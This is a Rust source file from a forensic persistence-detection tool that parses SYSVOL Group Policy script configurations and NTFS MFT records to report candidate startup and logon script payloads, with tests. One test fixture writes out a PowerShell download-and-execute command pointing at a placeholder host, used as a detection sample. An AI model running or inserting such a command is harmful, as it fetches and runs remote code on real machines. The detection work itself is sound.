//! SYSVOL script configuration and metadata-only payload candidates.
//! Configuration, file existence, policy application and execution are separate facts.
use super::{Check, decode_text};
use crate::persistence_hunter::{
    Finding, com,
    context::{explicit_drive, normalize_windows},
};
use chrono::{DateTime, SecondsFormat, Utc};
use mft::{MftParser, csv::FlatMftEntryWithName, entry::EntryFlags};
use std::collections::{BTreeMap, HashMap, HashSet};
use std::path::Path;

const MAX_INDEX: usize = 300_000;
#[derive(Clone, Debug)]
struct Location {
    guid: String,
    scope: String,
    scripts: String,
    tail: Vec<String>,
}
fn location(path: &str) -> Option<Location> {
    let path = normalize_windows(path).ok()?;
    let parts: Vec<_> = path.split('/').collect();
    let lower: Vec<_> = parts.iter().map(|s| s.to_ascii_lowercase()).collect();
    let root = usize::from(lower.first()? == "windows");
    if !matches!(lower.get(root)?.as_str(), "sysvol" | "sysvol_dfsr") {
        return None;
    }
    let policies = match lower.get(root + 1)?.as_str() {
        "domain" => root + 2,
        "sysvol" => root + 3,
        _ => return None,
    };
    if lower.get(policies)? != "policies" {
        return None;
    }
    let guid = com::guid(parts.get(policies + 1)?)?;
    let scope = lower.get(policies + 2)?.clone();
    if !matches!(scope.as_str(), "machine" | "user") || lower.get(policies + 3)? != "scripts" {
        return None;
    }
    Some(Location {
        guid,
        scope,
        scripts: parts[..policies + 4].join("/"),
        tail: parts[policies + 4..]
            .iter()
            .map(|s| s.to_string())
            .collect(),
    })
}
fn trigger(scope: &str, text: &str) -> bool {
    matches!(
        (scope, text),
        ("machine", "startup" | "shutdown") | ("user", "logon" | "logoff")
    )
}
fn launchable(path: &str) -> bool {
    path.rsplit('.').next().is_some_and(|s| {
        matches!(
            s.to_ascii_lowercase().as_str(),
            "exe"
                | "com"
                | "scr"
                | "cmd"
                | "bat"
                | "ps1"
                | "psm1"
                | "vbs"
                | "vbe"
                | "js"
                | "jse"
                | "wsf"
                | "wsh"
                | "hta"
                | "dll"
                | "msi"
        )
    })
}
fn payload(path: &str) -> Option<Location> {
    let loc = location(path)?;
    (loc.tail.len() >= 2
        && trigger(&loc.scope, &loc.tail[0].to_ascii_lowercase())
        && launchable(path))
    .then_some(loc)
}

/// Keep repeated section instances separate. An ambiguous argument is not borrowed
/// from another version/section, and an invalid machine/user trigger is not active.
fn commands(text: &str, scope: &str) -> (Vec<(String, String, String)>, Vec<String>) {
    let mut sections = Vec::<(String, BTreeMap<u32, (Vec<String>, Vec<String>)>)>::new();
    let mut issues = Vec::new();
    for (line_no, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with([';', '#']) {
            continue;
        }
        if let Some(name) = line.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
            sections.push((name.trim().to_ascii_lowercase(), BTreeMap::new()));
            continue;
        }
        let Some((section, entries)) = sections.last_mut() else {
            issues.push(format!("line {} outside a section", line_no + 1));
            continue;
        };
        if !trigger(scope, section) {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            issues.push(format!("invalid line {}", line_no + 1));
            continue;
        };
        let key = key.trim().to_ascii_lowercase();
        let pair = key
            .strip_suffix("cmdline")
            .map(|s| (s, true))
            .or_else(|| key.strip_suffix("parameters").map(|s| (s, false)));
        let Some((id, cmd)) = pair else {
            continue;
        };
        let Some(index) = id
            .parse::<u32>()
            .ok()
            .filter(|n| *n < (1 << 31) && !id.is_empty() && id.bytes().all(|c| c.is_ascii_digit()))
        else {
            issues.push(format!("invalid script index on line {}", line_no + 1));
            continue;
        };
        let entry = entries.entry(index).or_default();
        if cmd {
            entry.0.push(value.trim().to_string());
        } else {
            entry.1.push(value.trim().to_string());
        }
    }
    let mut out = Vec::new();
    for (section, entries) in sections {
        for (index, (cmds, args)) in entries {
            if cmds.len() != 1 || args.len() != 1 {
                issues.push(format!("{section} script {index}: missing or duplicate command/parameters; ambiguous parameters omitted"));
            }
            for cmd in cmds.into_iter().filter(|s| !s.is_empty()) {
                out.push((
                    section.clone(),
                    cmd,
                    if args.len() == 1 {
                        args[0].clone()
                    } else {
                        String::new()
                    },
                ));
            }
        }
    }
    (out, issues)
}

fn informative(f: &mut Finding, reason: &'static str) {
    f.base_classification = Some(("INFO", reason));
}
fn target(loc: &Location, kind: &str, command: &str, volume: char) -> Option<String> {
    let command = command.trim().trim_matches('"');
    if explicit_drive(command).is_some() || command.starts_with('%') {
        return Some(command.into());
    }
    if command.starts_with("\\\\") {
        return None;
    } // Never fetch a remote share.
    if matches!(
        command.to_ascii_lowercase().as_str(),
        "powershell.exe"
            | "pwsh.exe"
            | "cmd.exe"
            | "wscript.exe"
            | "cscript.exe"
            | "rundll32.exe"
            | "msiexec.exe"
            | "regsvr32.exe"
    ) {
        return Some(command.into());
    }
    if command.starts_with(['\\', '/']) {
        return Some(format!("{volume}:{command}"));
    }
    Some(format!("{volume}:/{}/{kind}/{command}", loc.scripts))
}

pub(super) fn run(check: &mut Check<'_>) {
    // Preserve the existing local-policy behavior.
    super::text::gp_scripts(check);
    let mut claimed = HashSet::<(char, String)>::new();
    let initial = check.scan.findings.len();
    let mut configurations = 0;
    for file in check.files(|p| {
        location(p).is_some_and(|l| {
            l.tail.len() == 1
                && matches!(
                    l.tail[0].to_ascii_lowercase().as_str(),
                    "scripts.ini" | "psscripts.ini"
                )
        })
    }) {
        check.sources += 1;
        configurations += 1;
        let loc = location(&file.logical).expect("filtered SYSVOL path");
        let Some(bytes) = check.read(&file, 4 * 1024 * 1024) else {
            continue;
        };
        let text = match decode_text(&bytes, true) {
            Ok(s) => s,
            Err(e) => {
                check.issue("malformed", format!("{}: {e}", file.physical.display()));
                continue;
            }
        };
        let (commands, issues) = commands(&text, &loc.scope);
        for issue in issues {
            check.issue("malformed", format!("{}: {issue}", file.physical.display()));
        }
        for (kind, command, args) in commands {
            let quoted = if command.contains(' ') && !command.starts_with('"') {
                format!("\"{command}\"")
            } else {
                command.clone()
            };
            let value = format!("{quoted} {args}").trim().to_string();
            let mut f = check.file_finding(
                &file,
                &value,
                if loc.scope == "machine" {
                    "SYSTEM"
                } else {
                    "USER"
                },
            );
            f.record_status = "sysvol_configuration".into();
            f.description = format!(
                "SYSVOL GPO {} {} {kind} command registered in {}. Configuration does not establish that the GPO was linked, enabled, applied, or executed.",
                loc.guid, loc.scope, file.logical
            );
            informative(
                &mut f,
                "Configured SYSVOL script; configuration alone is not an attack verdict",
            );
            f.base_classification = crate::persistence_hunter::patterns::command_assessment(&value)
                .or(f.base_classification);
            let drive = if file.volume == check.ctx.system_drive() {
                check.ctx.original_system_drive()
            } else {
                file.volume
            };
            let (effective, _) = crate::persistence_hunter::resolver::command_target(&value);
            let resolved = target(&loc, &kind, &effective, drive);
            if let Some(path) = resolved {
                let low = path.to_ascii_lowercase();
                if [
                    "%userprofile%",
                    "%appdata%",
                    "%localappdata%",
                    "%homedrive%",
                    "%homepath%",
                    "%username%",
                ]
                .iter()
                .any(|s| low.contains(s))
                {
                    f.resolution_unavailable = true;
                    f.resolution_status = "unknown_gpo_user_context".into();
                } else {
                    if let Ok(pathkey) = normalize_windows(&path) {
                        let target_drive = explicit_drive(&path)
                            .and_then(|d| check.ctx.captured_drive(d))
                            .unwrap_or(file.volume);
                        claimed.insert((target_drive, pathkey.to_lowercase()));
                    }
                    f.resolve_target = path;
                }
            } else {
                f.resolution_unavailable = true;
                f.resolution_status = "remote_gpo_target".into();
            }
            check.scan.findings.push(f);
        }
    }
    // Unreferenced collected payloads remain candidates, not registered scripts.
    for file in check.files(|p| payload(p).is_some()) {
        if claimed.contains(&(file.volume, file.logical.to_lowercase())) {
            continue;
        }
        check.sources += 1;
        let loc = payload(&file.logical).expect("filtered GPO payload");
        let drive = if file.volume == check.ctx.system_drive() {
            check.ctx.original_system_drive()
        } else {
            file.volume
        };
        let mut f = check.file_finding(
            &file,
            &format!("{}:\\{}", drive, file.logical.replace('/', "\\")),
            if loc.scope == "machine" {
                "SYSTEM"
            } else {
                "USER"
            },
        );
        informative(
            &mut f,
            "Unreferenced SYSVOL payload; presence does not establish script registration or execution",
        );
        f.record_status = "sysvol_payload".into();
        f.description = format!(
            "Executable/script-like file under SYSVOL GPO {} {} {}. Script configuration was not linked to this file; it may be legitimate, stale, unreferenced, or omitted from the acquisition.",
            loc.guid, loc.scope, loc.tail[0]
        );
        claimed.insert((file.volume, file.logical.to_lowercase()));
        check.scan.findings.push(f);
    }
    let sources: Vec<_> = if let Some(path) = &check.ctx.explicit_mft {
        vec![path.clone()]
    } else {
        check
            .ctx
            .files
            .iter()
            .filter(|f| !f.logical.contains('/') && crate::mft::is_mft_name(&f.logical))
            .map(|f| f.physical.clone())
            .collect()
    };
    for source in sources {
        scan_mft(check, &source, &mut claimed);
    }
    if configurations == 0 && check.scan.findings.len() > initial {
        check.issue("not_collected", "SYSVOL script configuration was not collected; payload metadata does not establish registration, GPO application or execution");
    }
}

struct Directory {
    sequence: u16,
    allocated: bool,
    parent: (u64, u16),
    trigger_root: bool,
}
impl Directory {
    fn accepts(&self, sequence: u16) -> bool {
        // Match ys-mft-parser's is_referenced_version: freeing a record advances
        // its sequence once; an allocated replacement must never inherit children.
        sequence == 0
            || self.sequence == sequence
            || (!self.allocated && self.sequence == sequence.wrapping_add(1))
    }
}

fn scan_mft(check: &mut Check<'_>, source: &Path, claimed: &mut HashSet<(char, String)>) {
    check.sources += 1;
    let mut parser = match MftParser::from_path(source) {
        Ok(p) => p,
        Err(e) => {
            check.issue("malformed", format!("{}: {e}", source.display()));
            return;
        }
    };
    let mut parents = HashMap::<u64, Directory>::new();
    let mut files = Vec::new();
    let mut damaged = 0;
    for id in 0..parser.get_entry_count() {
        let entry = match parser.get_entry(id) {
            Ok(e) if &e.header.signature == b"FILE" => e,
            Ok(_) => continue,
            Err(_) => {
                damaged += 1;
                continue;
            }
        };
        if !entry.header.is_base_record() {
            continue;
        }
        let Some(name) = entry.find_best_name_attribute() else {
            continue;
        };
        let parent = (name.parent.entry, name.parent.sequence);
        let text = name.name.to_utf8_string();
        if entry.header.flags.contains(EntryFlags::INDEX_PRESENT) {
            if parents.len() >= MAX_INDEX {
                check.issue("limit_reached", "SYSVOL MFT directory index limit reached");
                break;
            }
            let trigger_root = matches!(
                text.to_ascii_lowercase().as_str(),
                "startup" | "shutdown" | "logon" | "logoff"
            ) && parser
                .get_full_path_for_entry(&entry)
                .ok()
                .flatten()
                .is_some_and(|path| {
                    location(&path.to_string_lossy()).is_some_and(|loc| {
                        loc.tail.len() == 1
                            && trigger(&loc.scope, &loc.tail[0].to_ascii_lowercase())
                    })
                });
            parents.insert(
                id,
                Directory {
                    sequence: entry.header.sequence,
                    allocated: entry.is_allocated(),
                    parent,
                    trigger_root,
                },
            );
        } else if launchable(&text) {
            if files.len() >= MAX_INDEX {
                check.issue("limit_reached", "SYSVOL MFT candidate limit reached");
                break;
            }
            files.push((id, parent));
        }
    }
    if damaged > 0 {
        check.issue(
            "malformed",
            format!(
                "{}: {damaged} unreadable MFT records; SYSVOL coverage incomplete",
                source.display()
            ),
        );
    }
    let drive = check.ctx.drive_of(source);
    for (id, mut parent) in files {
        let mut relevant = false;
        for _ in 0..64 {
            let Some(directory) = parents.get(&parent.0).filter(|d| d.accepts(parent.1)) else {
                break;
            };
            if directory.trigger_root {
                relevant = true;
                break;
            }
            if directory.parent == parent {
                break;
            }
            parent = directory.parent;
        }
        if !relevant {
            continue;
        }
        let Ok(entry) = parser.get_entry(id) else {
            continue;
        };
        let Ok(Some(path)) = parser.get_full_path_for_entry(&entry) else {
            continue;
        };
        let Some(loc) = payload(&path.to_string_lossy()) else {
            continue;
        };
        let Ok(logical) = normalize_windows(&path.to_string_lossy()) else {
            continue;
        };
        let extensions = parser.get_extension_entries(&entry);
        let row = FlatMftEntryWithName::from_entry_with_path(&entry, &extensions, path);
        if !row.is_deleted && !claimed.insert((drive, logical.to_lowercase())) {
            // Keep the independent MFT provenance when a configuration/current
            // payload already represents this path; do not replace its time/hash.
            for finding in &mut check.scan.findings {
                let target = normalize_windows(&finding.resolve_target).ok();
                let target_drive = explicit_drive(&finding.resolve_target)
                    .and_then(|d| check.ctx.captured_drive(d))
                    .unwrap_or_else(|| check.ctx.drive_of(Path::new(&finding.source_file)));
                if finding.record_status.starts_with("sysvol_")
                    && target_drive == drive
                    && target
                        .as_deref()
                        .is_some_and(|p| p.eq_ignore_ascii_case(&logical))
                {
                    finding.description.push_str(&format!(" Independent MFT reference: {} entry {} sequence {} (file metadata, not policy application/execution).",source.display(),row.entry_id,row.sequence));
                }
            }
            continue;
        }
        let original = if drive == check.ctx.system_drive() {
            check.ctx.original_system_drive()
        } else {
            drive
        };
        let mut f = check.finding(
            &logical.replace('/', "\\"),
            &format!("{original}:\\{}", logical.replace('/', "\\")),
            if loc.scope == "machine" {
                "SYSTEM"
            } else {
                "USER"
            },
        );
        f.source_file = source.display().to_string();
        f.record_identity = format!(
            "mft:{drive}:{}:{}:{}",
            row.entry_id,
            row.sequence,
            source.display()
        );
        f.record_status = if row.is_deleted {
            "mft_deleted"
        } else {
            "mft_allocated"
        }
        .into();
        f.resolution_unavailable = true;
        f.resolution_status = "metadata_only".into();
        f.skip_correlation = true;
        f.change_evidence = "MFT_METADATA".into();
        f.description = format!(
            "SYSVOL GPO {} {} {} payload reference in MFT entry {} sequence {} ({}). File metadata only: bytes, script registration, GPO linkage/application and execution are not established.",
            loc.guid,
            loc.scope,
            loc.tail[0],
            row.entry_id,
            row.sequence,
            if row.is_deleted {
                "deleted"
            } else {
                "allocated"
            }
        );
        if let Some(modified) = row.standard_info_last_modified
            && let Some(when) = DateTime::<Utc>::from_timestamp(
                modified.as_second(),
                modified.subsec_nanosecond() as u32,
            )
        {
            f.last_change = when.to_rfc3339_opts(SecondsFormat::Nanos, true);
            f.change_source = format!(
                "$MFT {}; entry {} sequence {}; $SI Modified of {} (file timestamp, not policy registration)",
                source.display(),
                row.entry_id,
                row.sequence,
                logical
            );
        }
        informative(
            &mut f,
            "SYSVOL payload reference recovered from MFT; configuration and execution unproven",
        );
        check.scan.findings.push(f);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::persistence_hunter::{
        checks, context::Context, file_checks, profile::Profile, resolver, timeline,
    };
    use std::fs;
    const ID: &str = "{00112233-4455-6677-8899-AABBCCDDEEFF}";
    fn tree(root: &Path, tail: &str, bytes: &[u8]) -> std::path::PathBuf {
        let path = root.join(format!(
            "Windows/SYSVOL/domain/Policies/{ID}/Machine/Scripts/{tail}"
        ));
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(&path, bytes).unwrap();
        path
    }
    fn scan(root: &Path) -> crate::persistence_hunter::Scan {
        let ctx = Context::open(root, true).unwrap();
        let defs: Vec<_> = checks::catalogue()
            .iter()
            .filter(|d| d.id == "gp_scripts")
            .cloned()
            .collect();
        let mut scan = file_checks::run(&ctx, &defs);
        let profile = Profile::load(None, checks::catalogue()).unwrap();
        for f in &mut scan.findings {
            resolver::enrich(&ctx, f);
            profile.classify(f);
        }
        timeline::enrich(&ctx, &mut scan.findings, None);
        scan
    }
    #[test]
    fn sysvol_paths_require_a_real_policy_and_valid_scope() {
        for prefix in [
            "Windows/SYSVOL/domain",
            "Windows/SYSVOL_DFSR/domain",
            "Windows/SYSVOL/sysvol/example.test",
            "SYSVOL/domain",
        ] {
            assert!(
                location(&format!(
                    "{prefix}/Policies/{ID}/Machine/Scripts/scripts.ini"
                ))
                .is_some()
            );
        }
        for path in [
            format!("Users/alice/SYSVOL/domain/Policies/{ID}/Machine/Scripts/scripts.ini"),
            "Windows/SYSVOL/domain/Policies/not-a-guid/Machine/Scripts/scripts.ini".to_string(),
            format!("Windows/SYSVOL/domain/Policies/{ID}/Other/Scripts/scripts.ini"),
        ] {
            assert!(location(&path).is_none());
        }
    }
    #[test]
    fn configured_benign_script_is_information_and_not_duplicated_as_a_payload() {
        let dir = tempfile::tempdir().unwrap();
        let text = "[Startup]\r\n0CmdLine=configure.cmd\r\n0Parameters=/quiet\r\n[Logon]\r\n0CmdLine=ignored.cmd\r\n0Parameters=ignored\r\n";
        let mut utf16 = vec![0xff, 0xfe];
        utf16.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
        let config = tree(dir.path(), "scripts.ini", &utf16);
        tree(
            dir.path(),
            "Startup/configure.cmd",
            b"REM legitimate configuration",
        );
        let scan = scan(dir.path());
        assert_eq!(scan.findings.len(), 1);
        let f = &scan.findings[0];
        assert_eq!(f.severity, "INFO");
        assert_eq!(f.value, "configure.cmd /quiet");
        assert_eq!(
            f.source_file,
            fs::canonicalize(config).unwrap().display().to_string()
        );
        assert_eq!(f.exists, Some(true));
        assert!(f.resolved_path.ends_with("Startup/configure.cmd"));
        assert_eq!(f.record_status, "sysvol_configuration");
        assert_eq!(scan.coverage[0].status, "complete");
    }
    #[test]
    fn duplicate_sections_do_not_create_commands_with_another_sections_arguments() {
        let (rows, issues) = commands(
            "[Startup]\n0CmdLine=one.cmd\n[Startup]\n0Parameters=not-ones-arguments\n0CmdLine=two.cmd\n",
            "machine",
        );
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].2, "");
        assert_eq!(rows[1].2, "not-ones-arguments");
        assert!(!issues.is_empty());
        assert!(
            commands("[Logon]\n0CmdLine=no.cmd\n0Parameters=\n", "machine")
                .0
                .is_empty()
        );
        let (rows, issues) = commands(
            "[Startup]\n0CmdLine=one.cmd\n0Parameters=a\n0Parameters=b\n+1CmdLine=bad.cmd\n",
            "machine",
        );
        assert_eq!(rows.len(), 1);
        assert!(rows[0].2.is_empty());
        assert!(!issues.is_empty());
    }
    #[test]
    fn remote_and_unknown_user_targets_are_preserved_without_guessing_a_payload() {
        let dir = tempfile::tempdir().unwrap();
        tree(dir.path(),"scripts.ini",b"[Startup]\n0CmdLine=\\\\server\\share\\bootstrap.cmd\n0Parameters=\n1CmdLine=%USERPROFILE%\\bootstrap.cmd\n1Parameters=\n");
        let scan = scan(dir.path());
        assert_eq!(scan.findings.len(), 2);
        for f in &scan.findings {
            assert_eq!(f.severity, "INFO");
            assert!(f.exists.is_none());
            assert!(f.sha256.is_empty());
        }
        assert!(
            scan.findings
                .iter()
                .any(|f| f.resolution_status == "remote_gpo_target")
        );
        assert!(
            scan.findings
                .iter()
                .any(|f| f.resolution_status == "unknown_gpo_user_context")
        );
    }
    #[test]
    fn suspicious_download_and_execute_command_is_a_medium_review_candidate() {
        let dir = tempfile::tempdir().unwrap();
        tree(dir.path(),"psscripts.ini",b"[Startup]\n0CmdLine=powershell.exe\n0Parameters=-c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/stage')\n");
        let scan = scan(dir.path());
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].severity, "MEDIUM");
        assert!(scan.findings[0].policy_reason.contains("not proof"));
    }
    #[test]
    fn profile_block_rules_override_the_information_default() {
        let dir = tempfile::tempdir().unwrap();
        tree(
            dir.path(),
            "scripts.ini",
            b"[Startup]\n0CmdLine=deploy.cmd\n0Parameters=\n",
        );
        let mut findings = scan(dir.path()).findings;
        let path = dir.path().join("policy.yaml");
        fs::write(&path,"checks:\n  gp_scripts:\n    block:\n      - reason: test policy\n        value_matches: deploy\\.cmd\n").unwrap();
        let profile = Profile::load(Some(&path), checks::catalogue()).unwrap();
        profile.classify(&mut findings[0]);
        assert_eq!(findings[0].severity, "HIGH");
    }
    fn attr(kind: u32, value: &[u8]) -> Vec<u8> {
        let size = (24 + value.len()).next_multiple_of(8);
        let mut a = vec![0; size];
        a[..4].copy_from_slice(&kind.to_le_bytes());
        a[4..8].copy_from_slice(&(size as u32).to_le_bytes());
        a[16..20].copy_from_slice(&(value.len() as u32).to_le_bytes());
        a[20..22].copy_from_slice(&24u16.to_le_bytes());
        a[24..24 + value.len()].copy_from_slice(value);
        a
    }
    fn record(
        id: u32,
        name: &str,
        parent: u64,
        directory: bool,
        deleted: bool,
        short: bool,
    ) -> Vec<u8> {
        let mut r = vec![0; 1024];
        r[..4].copy_from_slice(b"FILE");
        r[4..6].copy_from_slice(&48u16.to_le_bytes());
        r[6..8].copy_from_slice(&3u16.to_le_bytes());
        r[16..18].copy_from_slice(&1u16.to_le_bytes());
        r[20..22].copy_from_slice(&56u16.to_le_bytes());
        let flags = if deleted { 0u16 } else { 1 } | if directory { 2 } else { 0 };
        r[22..24].copy_from_slice(&flags.to_le_bytes());
        r[28..32].copy_from_slice(&1024u32.to_le_bytes());
        r[44..48].copy_from_slice(&id.to_le_bytes());
        let mut si = vec![0; 48];
        for off in [0, 8, 16, 24] {
            si[off..off + 8].copy_from_slice(&133_801_632_000_000_000u64.to_le_bytes());
        }
        let mut attributes = attr(0x10, &si);
        let mut filename = |name: &str, namespace: u8| {
            let mut f = vec![0; 66];
            f[..8].copy_from_slice(&(parent | (1u64 << 48)).to_le_bytes());
            f[64] = name.encode_utf16().count() as u8;
            f[65] = namespace;
            f.extend(name.encode_utf16().flat_map(u16::to_le_bytes));
            attributes.extend(attr(0x30, &f));
        };
        filename(name, 1);
        if short {
            filename("PAYLOA~1.EXE", 2);
        }
        attributes.extend(u32::MAX.to_le_bytes());
        let used = 56 + attributes.len();
        r[24..28].copy_from_slice(&(used as u32).to_le_bytes());
        r[56..used].copy_from_slice(&attributes);
        r[48..50].copy_from_slice(&0xaaaa_u16.to_le_bytes());
        r[50..52].copy_from_slice(&[0, 0]);
        r[52..54].copy_from_slice(&[0, 0]);
        r[510..512].copy_from_slice(&0xaaaa_u16.to_le_bytes());
        r[1022..1024].copy_from_slice(&0xaaaa_u16.to_le_bytes());
        r
    }
    fn mft() -> Vec<u8> {
        let mut records: Vec<_> = (0..16)
            .map(|i| record(i, &format!("unused{i}"), 5, false, false, false))
            .collect();
        for (id, name, parent) in [
            (5, ".", 5),
            (6, "Windows", 5),
            (7, "SYSVOL", 6),
            (8, "domain", 7),
            (9, "Policies", 8),
            (10, ID, 9),
            (11, "Machine", 10),
            (12, "Scripts", 11),
            (13, "Startup", 12),
        ] {
            records[id] = record(id as u32, name, parent, true, false, false);
        }
        records[14] = record(14, "payload.exe", 13, false, false, true);
        records[15] = record(15, "old.ps1", 13, false, true, false);
        records.concat()
    }
    #[test]
    fn real_mft_records_find_generic_payloads_once_and_keep_deleted_state() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("Windows")).unwrap();
        fs::write(dir.path().join("$MFT"), mft()).unwrap();
        let scan = scan(dir.path());
        assert_eq!(scan.findings.len(), 2, "{:#?}", scan.coverage);
        assert!(
            scan.findings
                .iter()
                .any(|f| f.value.ends_with("payload.exe"))
        );
        assert!(
            scan.findings
                .iter()
                .any(|f| f.record_status == "mft_deleted" && f.value.ends_with("old.ps1"))
        );
        for f in &scan.findings {
            assert_eq!(f.severity, "INFO");
            assert!(f.exists.is_none());
            assert!(f.sha256.is_empty());
            assert_eq!(f.change_evidence, "MFT_METADATA");
            assert!(f.change_source.contains("sequence 1"));
        }
        assert_eq!(scan.coverage[0].status, "partial");
    }
    fn mark_directory(bytes: &mut [u8], id: usize, sequence: u16, allocated: bool) {
        let r = &mut bytes[id * 1024..(id + 1) * 1024];
        r[16..18].copy_from_slice(&sequence.to_le_bytes());
        r[22..24].copy_from_slice(&(2u16 | u16::from(allocated)).to_le_bytes());
    }
    #[test]
    fn deleted_startup_and_deleted_gpo_ancestors_retain_both_payloads() {
        for directories in [&[13][..], &[10, 11, 12, 13][..]] {
            let dir = tempfile::tempdir().unwrap();
            let mut bytes = mft();
            for &id in directories {
                mark_directory(&mut bytes, id, 2, false);
            }
            for id in [14, 15] {
                bytes[id * 1024 + 16..id * 1024 + 18].copy_from_slice(&2u16.to_le_bytes());
                bytes[id * 1024 + 22..id * 1024 + 24].copy_from_slice(&0u16.to_le_bytes());
            }
            fs::write(dir.path().join("$MFT"), bytes).unwrap();
            let scan = scan(dir.path());
            assert_eq!(
                scan.findings.len(),
                2,
                "deleted directories {directories:?}: {:#?}",
                scan.coverage
            );
            assert!(
                scan.findings
                    .iter()
                    .all(|f| f.record_status == "mft_deleted" && f.severity == "INFO")
            );
        }
    }
    #[test]
    fn reused_or_unrelated_parent_sequences_do_not_attach_payloads() {
        for (sequence, allocated) in [(2, true), (3, false)] {
            let dir = tempfile::tempdir().unwrap();
            let mut bytes = mft();
            mark_directory(&mut bytes, 13, sequence, allocated);
            fs::write(dir.path().join("$MFT"), bytes).unwrap();
            assert!(
                scan(dir.path()).findings.is_empty(),
                "sequence={sequence}, allocated={allocated}"
            );
        }
    }
    #[test]
    fn directory_versions_match_the_parser_including_sequence_wrap() {
        let mut d = Directory {
            sequence: 0,
            allocated: false,
            parent: (0, 0),
            trigger_root: false,
        };
        assert!(d.accepts(u16::MAX));
        assert!(d.accepts(0));
        d.allocated = true;
        assert!(!d.accepts(u16::MAX));
        d.sequence = 5;
        assert!(d.accepts(5));
        assert!(d.accepts(0));
        assert!(!d.accepts(4));
    }
    #[test]
    fn mft_metadata_never_hashes_a_current_file_at_a_deleted_reference() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("$MFT"), mft()).unwrap();
        tree(dir.path(), "Startup/old.ps1", b"new replacement file");
        let scan = scan(dir.path());
        // Current bytes and a deleted reference at the same path are separate facts.
        assert!(
            scan.findings
                .iter()
                .all(|f| f.value.ends_with("old.ps1") || f.value.ends_with("payload.exe"))
        );
        assert_eq!(scan.findings.len(), 3);
        let historical = scan
            .findings
            .iter()
            .find(|f| f.record_status == "mft_deleted")
            .unwrap();
        assert!(historical.sha256.is_empty() && historical.exists.is_none());
    }
    #[test]
    fn invalid_policy_paths_and_ordinary_documents_are_not_payload_findings() {
        let dir = tempfile::tempdir().unwrap();
        tree(dir.path(), "Startup/readme.txt", b"instructions");
        assert!(scan(dir.path()).findings.is_empty());
    }
    #[test]
    fn configuration_keeps_an_independent_mft_reference_to_an_uncollected_payload() {
        let dir = tempfile::tempdir().unwrap();
        tree(
            dir.path(),
            "scripts.ini",
            b"[Startup]\n0CmdLine=payload.exe\n0Parameters=\n",
        );
        fs::write(dir.path().join("$MFT"), mft()).unwrap();
        let scan = scan(dir.path());
        let config = scan
            .findings
            .iter()
            .find(|f| f.record_status == "sysvol_configuration")
            .unwrap();
        assert!(config.description.contains("Independent MFT reference"));
        assert!(config.description.contains("entry 14 sequence 1"));
        assert!(config.sha256.is_empty() && config.exists.is_none());
        assert_eq!(scan.findings.len(), 2); // configuration plus a separate deleted payload.
    }
}
